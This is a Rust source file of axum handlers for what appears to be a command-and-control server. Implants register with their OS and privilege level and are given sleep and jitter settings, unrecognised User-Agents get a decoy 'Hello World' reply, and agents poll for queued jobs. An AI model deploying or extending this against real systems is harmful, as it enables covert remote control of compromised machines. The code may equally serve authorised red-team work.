use std::{collections::HashMap, net::SocketAddr, ops::Deref, sync::Arc};

use chrono;
use serde::Deserialize;
use uuid::{NoContext, Timestamp, Uuid};
use axum::{
    extract::{ConnectInfo, Json, Query, State},
    http::{HeaderMap, StatusCode},
};

use crate::{Agent, MAShared};

#[derive(Deserialize)]
pub struct AgentInfo {
    os: String,
    elevated: bool
}

pub async fn agent_register(
        hs: HeaderMap,
        ConnectInfo(addr): ConnectInfo<SocketAddr>,
        State(shared): State<Arc<MAShared>>,
        Json(agent_info): Json<AgentInfo>,
    ) -> String {
    let user_agent = hs.get("user-agent").unwrap();

    if shared.profile.agents.allowed.iter().any(|v| v == user_agent) {
        let uuid = Uuid::new_v7(Timestamp::now(NoContext)).to_string();

        shared.agents.lock().await.push(Agent { 
            uuid: uuid.clone(),
            addr: addr.to_string(),
            os: agent_info.os.clone(),
            elevated: agent_info.elevated,
            sleep: shared.profile.agents.sleep,
            jitter: shared.profile.agents.jitter, 
            last_ping: chrono::Local::now().timestamp()
        });

        uuid
    } else {
        "Hello World".to_string()
    }
}

pub async fn get_target(
    Query(params): Query<HashMap<String, String>>,
    State(shared): State<Arc<MAShared>>,
) -> Result<String, StatusCode> {
    let uuid = match params.get("uuid") {
        Some(r) => r,
        None => return Err(StatusCode::BAD_REQUEST)
    };

    let mut shared_guard = shared.agents.lock().await;
    let agent = shared_guard.iter_mut().find(|v| v.uuid.eq(uuid));

    let agent = match agent {
        Some(r) => r,
        None => return Err(StatusCode::NON_AUTHORITATIVE_INFORMATION)
    };


    agent.last_ping = chrono::Local::now().timestamp();
    return Ok(serde_json::to_string(shared.jobs.lock().await.deref()).unwrap());
}
